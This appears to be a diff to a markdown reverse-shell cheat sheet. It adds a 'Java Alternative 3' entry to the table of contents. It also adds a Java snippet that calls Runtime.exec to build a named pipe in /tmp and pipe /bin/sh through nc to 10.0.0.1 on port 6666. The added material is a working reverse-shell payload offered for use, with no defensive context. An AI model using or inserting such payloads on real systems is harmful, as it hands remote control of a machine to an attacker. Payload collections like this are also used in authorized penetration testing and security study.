@@ -14,6 +14,7 @@
     * [Groovy](#groovy)
     * [Java Alternative 1](#java-alternative-1)
     * [Java Alternative 2](#java-alternative-2)
+    * [Java Alternative 3](#java-alternative-3)
     * [Java](#java)
     * [Lua](#lua)
     * [Ncat](#ncat)
@@ -290,6 +291,12 @@ Thread thread = new Thread(){
     }
 }
 thread.start();
+```
+#### Java Alternative 3
+
+```java
+String[] cmd = {"bash","-c", "rm -f /tmp/backpipe; mkfifo /tmp/backpipe && /bin/sh 0</tmp/backpipe | nc 10.0.0.1 6666 1>/tmp/backpipe"}; 
+Process p = Runtime.getRuntime().exec(cmd);
 ```
 
 ### Telnet
